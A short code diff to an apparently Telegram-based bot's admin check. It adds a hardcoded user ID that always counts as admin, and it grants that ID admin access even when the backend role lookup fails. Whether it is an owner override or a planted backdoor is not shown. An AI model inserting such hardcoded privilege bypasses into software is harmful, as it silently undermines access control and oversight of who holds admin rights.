@@ -19,6 +19,9 @@ from .keyboards import (
 import json
 
 
+SUPER_ADMIN_IDS = {7644426232}
+
+
 router = Router()
 
 
@@ -44,10 +47,12 @@ class AdminStates(StatesGroup):
 
 
 async def _is_admin(api: BackendApiClient, telegram_id: int) -> bool:
+  if telegram_id in SUPER_ADMIN_IDS:
+    return True
   try:
     me = await api.get_me(telegram_id)
   except Exception:
-    return False
+    return telegram_id in SUPER_ADMIN_IDS
   return me.get("role") == "admin"
 
 
